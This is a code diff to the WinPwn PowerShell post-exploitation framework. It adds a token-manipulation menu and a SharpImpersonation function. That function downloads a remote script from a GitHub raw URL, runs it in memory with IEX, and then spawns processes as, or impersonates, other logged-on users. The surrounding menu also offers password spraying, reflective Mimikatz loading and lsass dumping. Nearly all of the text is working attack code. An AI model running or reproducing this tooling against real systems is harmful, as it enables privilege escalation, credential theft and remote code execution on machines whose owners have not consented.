@@ -34,6 +34,8 @@ public class ztzsw {
 
 }
 
+$Script:S3cur3Th1sSh1t_repo = "https://raw.githubusercontent.com/S3cur3Th1sSh1t"
+
 function dependencychecks
 {
     <#
@@ -3903,6 +3905,137 @@ __        ___       ____
 
 }
 
+function TokenManipulation
+{
+  <#
+        .DESCRIPTION
+        Token Manipulation / Impersonation.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    #Post Exploitation
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput   
+    )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+
+    @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> Token Manipulation
+'@
+        if (isadmin)
+        {
+
+
+        do
+        {
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. List possible users to impersonate and enumerate via Windows API (slow, stealthier)!'
+            Write-Host -ForegroundColor Green '2. List possible users to impersonate via WMI (fast, less stealthy)! '
+            Write-Host -ForegroundColor Green '3. Spawn a new cmd as another user! '
+            Write-Host -ForegroundColor Green '4. Impersonate another user in this process! '
+            Write-Host -ForegroundColor Green '5. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{SharpImpersonation -list}
+                2{SharpImpersonation -listwmi}
+                3{SharpImpersonation}
+                4{SharpImpersonation -CurrentThread}
+            }
+        }
+        While ($masterquestion -ne 5)
+        
+        }
+        else
+        {
+             @'
+             
+     __                ___  ___  __     ___  __      __   ___          __               
+\ / /  \ |  |    |\ | |__  |__  |  \     |  /  \    |__) |__      /\  |  \  |\/| | |\ | 
+ |  \__/ \__/    | \| |___ |___ |__/     |  \__/    |__) |___    /~~\ |__/  |  | | | \| 
+                                                                                        
+
+'@   
+
+        }
+
+}
+
+function SharpImpersonation
+{
+[CmdletBinding()]
+    Param (
+        [Switch]
+        $list,
+        [Switch]
+        $listwmi,
+        [Switch]
+        $CurrentThread,
+        [string]
+        $username = ""
+    )
+
+if (isadmin)
+{
+
+IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpImpersonation.ps1')
+
+if ($list)
+{
+    Invoke-SharpImpersonation -Command "list"
+    return
+}
+elseif($listwmi)
+{
+    Invoke-SharpImpersonation -Command "list wmi"
+    return
+}
+
+if($username -eq "")
+{
+    $username = Read-Host -Prompt 'Please enter the username to impersonate:'
+}
+
+if ($CurrentThread)
+{
+    Invoke-SharpImpersonation -Command "user:$username technique:ImpersonateLoggedOnuser"
+}
+else
+{
+    Invoke-SharpImpersonation -Command "user:$username technique:ImpersonateLoggedOnuser"
+}
+
+}
+else
+
+{
+
+@'
+             
+     __                ___  ___  __     ___  __      __   ___          __               
+\ / /  \ |  |    |\ | |__  |__  |  \     |  /  \    |__) |__      /\  |  \  |\/| | |\ | 
+ |  \__/ \__/    | \| |___ |___ |__/     |  \__/    |__) |___    /~~\ |__/  |  | | | \| 
+                                                                                        
+
+'@                                                                                        
+
+}
+
+}
+
 function laZagnemodule
 {
     <#
@@ -4745,7 +4878,8 @@ __        ___       ____
 	Write-Host -ForegroundColor Green '15. DomainPasswordSpray Attacks!'
 	Write-Host -ForegroundColor Green '16. Reflectively load Mimik@tz into memory!'
 	Write-Host -ForegroundColor Green '17. Dump lsass via various techniques!'
-        Write-Host -ForegroundColor Green '18. Exit. '
+    Write-Host -ForegroundColor Green '18. Impersonate other Users on this system via Token Manipulation!'
+        Write-Host -ForegroundColor Green '19. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -4768,9 +4902,10 @@ __        ___       ____
                         15{domainpassspray}
 			16{mimiload}
 			17{lsassdumps}
+            18{TokenManipulation}
     }
     }
-  While ($masterquestion -ne 18)
+  While ($masterquestion -ne 19)
      
    
 }
